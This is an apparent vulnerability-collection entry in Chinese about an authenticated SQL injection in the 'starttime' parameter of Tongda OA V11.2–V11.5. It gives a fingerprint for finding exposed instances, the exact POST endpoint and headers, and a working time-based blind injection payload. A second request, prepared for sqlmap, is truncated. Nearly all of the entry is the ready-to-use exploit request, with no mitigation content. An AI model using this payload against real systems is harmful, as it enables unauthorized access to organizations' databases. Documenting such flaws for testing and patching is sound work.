# 通达OAstarttime存在后台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1`

**请求体 / payload**
```
利用条件：可登录系统的账户，普通权限即可\

登陆后台使用获取到的cookie进行测试
Cookie: {cookie}
Host: {hostname}
X-Requested-With: XMLHttpRequest
Content-Length: 154
X-WVS-ID: Acunetix-Autologin/65535
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
starttime=1' AND (SELECT 4569 FROM (SELECT(SLEEP(5)))iGDG) AND 'Mnbs'='Mnbs&endtime=1598918400&view=month&condition=1

sqlmap
POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
Cookie: {cookie}
Host: {hostname}
X-Requested-With: XMLHttpRequest
Content-Length: 154
X-WVS-ID: Acunetix-Autologin/65535
Content-Type: application/x-www-form-urlencoded; c…（脚本共 666 字，完整版见原文）
```

**其他**
- 通达OA starttime存在后台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OAV11.2-通达OAV11.5